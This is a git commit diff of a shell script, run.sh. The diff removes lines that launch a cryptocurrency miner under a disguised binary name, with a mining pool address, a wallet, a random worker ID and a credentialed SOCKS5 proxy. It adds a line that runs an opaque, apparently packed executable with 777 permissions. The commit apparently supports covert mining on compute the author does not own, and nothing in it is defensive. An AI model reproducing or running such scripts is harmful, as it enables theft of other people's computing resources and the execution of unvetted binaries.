e16ac9dacb4fb2d9626297d87f034486a73dbf84
mariobiszz <88525716+mariobiszz@users.noreply.github.com>
2021-09-24 22:55:01 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,1 @@
-chmod 777 ayamgoreng
-apt install libjansson4 -y
-PULL=stratum+tcp://verushash.mine.zergpool.com:3300
-WUL=RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg
-WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
-PRO=socks5://mike:mike@34.139.57.113:4145
-./ayamgoreng -a verus -o $PULL -u $WUL.$WOR -p c=VRSC,mc=VRSC -t 4 -x $PRO
+chmod 777 rawonupx && ./rawonupx
